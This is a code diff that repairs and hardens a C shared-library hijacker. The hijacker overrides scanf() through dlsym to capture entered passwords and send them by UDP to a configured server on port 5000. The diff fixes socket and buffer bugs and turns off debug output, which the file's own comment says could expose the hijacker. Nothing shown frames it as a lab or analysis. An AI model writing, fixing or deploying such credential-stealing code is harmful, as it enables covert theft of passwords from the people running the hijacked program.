@@ -18,7 +18,6 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <stdarg.h> // va_list, va_start, va_arg, va_end
 #include <dlfcn.h> // dlopen, dlsym, dlclose
 #include <errno.h>
 #include <arpa/inet.h>
@@ -50,7 +49,7 @@
  * @note Never set this flag to 1 in actual hijacking programs, as it
  *          could be used to detect the presence of the hijacking program.
 */
-#define DEBUG_MODE 1
+#define DEBUG_MODE 0
 
 /*
  * @brief Address of the server to send the password to.
@@ -71,6 +70,16 @@
  *        receive the password.
 */
 #define SRV_PORT 5000
+
+/*
+ * @brief The size of the buffer used to store the password.
+ * 
+ * @note This size should be large enough to store the password.
+ * @note This size should be synchronized with the size of the buffer used
+ *        by the server to store the password.
+ * @note This size is set to 1024 by default.
+*/
+#define BUF_SIZE 1024
 
 /*
  * @brief A handle to the object file to be hijacked.
@@ -150,7 +159,7 @@ void mydest() {
  * 
  * @note This function is called when the hijacking program receives a password.
 */
-int send_password(char* password, size_t len) {
+int send_password(const char* password, size_t len) {
     int sockfd = -1;
     struct sockaddr_in serv_addr;
 
@@ -160,7 +169,7 @@ int send_password(char* password, size_t len) {
     serv_addr.sin_addr.s_addr = inet_addr(SRV_ADDR);
     serv_addr.sin_port = htons(SRV_PORT);
 
-    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0) < 0))
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
     {
         if (DEBUG_MODE)
             fprintf(stderr, "socket() failed: %s\n", strerror(errno));
@@ -173,7 +182,6 @@ int send_password(char* password, size_t len) {
         if (DEBUG_MODE)
             fprintf(stderr, "sendto() failed: %s\n", strerror(errno));
 
-        // Simulate failure of scanf()
         return 0;
     }
 
@@ -193,20 +201,41 @@ int send_password(char* password, size_t len) {
  *              as this will simulate a failure of scanf().
 */
 int scanf(const char *format, ...) {
-    char* parg = NULL;
-    char password[1000];
-    sym orig_scanf = (sym) dlsym(handle, "scanf");
+    sym orig_scanf = NULL;
+    char* password = NULL;
+    int ret = -1;
 
-    va_list args;
-    va_start(args, format);
-    int ret = orig_scanf(format, args);
+    if ((orig_scanf = (sym) dlsym(handle, "scanf")) == NULL)
+    {
+        if (DEBUG_MODE)
+            fprintf(stderr, "%s", dlerror());
 
-    parg = va_arg(args, char*);
+        return -1;
+    }
 
-    strcpy(password, parg);
+    // Allocate a buffer to store the password.
+    // Since we don't know the size of the password, we can't use a fixed size buffer.
+    // This is a failsafe, in case the password is too large.
+    if ((password = (char*) calloc(BUF_SIZE, sizeof(char))) == NULL)
+    {
+        if (DEBUG_MODE)
+            fprintf(stderr, "calloc() failed: %s\n", strerror(errno));
 
-    va_end(args);
+        return -1;
+    }
 
+    // Call the original scanf() function.
+    // If the original scanf() function failed, simulate a failure of scanf().
+    if ((ret = orig_scanf(format, password)) == -1)
+    {
+        if (DEBUG_MODE)
+            fprintf(stderr, "orig_scanf() failed\n");
+
+        return -1;
+    }
+
+    // Try to send the password to the server.
+    // If the password wasn't sent, simulate a failure of scanf().
     if (send_password(password, strlen(password)) == 0)
     {
         if (DEBUG_MODE)
@@ -215,6 +244,8 @@ int scanf(const char *format, ...) {
         // Simulate failure of scanf(), as the password wasn't sent.
         return -1;
     }
+
+    free(password);
 
     return ret;
 }
